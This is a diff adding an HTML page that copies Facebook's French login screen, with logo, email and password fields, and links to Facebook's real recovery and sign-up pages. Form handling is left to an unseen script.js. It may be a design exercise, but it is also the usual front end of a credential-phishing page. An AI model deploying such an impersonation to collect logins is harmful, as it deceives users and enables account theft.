@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - Facebook</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <!-- Logo Facebook -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1200px-Facebook_f_logo_%282019%29.svg.png" alt="Logo Facebook" class="facebook-logo">
+
+            <!-- Formulaire de Connexion -->
+            <form id="login-form" class="login-form">
+                <input type="text" id="email" placeholder="Adresse e-mail ou numéro de téléphone" name="email" required>
+                <input type="password" id="password" placeholder="Mot de passe" name="password" required>
+                <button type="submit" class="login-btn">Se connecter</button>
+            </form>
+
+            <!-- Lien Mot de passe oublié -->
+            <div class="forgot-password">
+                <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Mot de passe oublié ?</a>
+            </div>
+
+            <!-- Séparation avec ou -->
+            <div class="or-line">
+                <div class="line"></div>
+                <span>ou</span>
+                <div class="line"></div>
+            </div>
+
+            <!-- Bouton de création de compte (vert) -->
+            <div class="create-account">
+                <a href="https://www.facebook.com/r.php" class="create-account-btn">Créer un nouveau compte</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Lien vers le fichier JavaScript -->
+    <script src="script.js"></script>
+</body>
+</html>
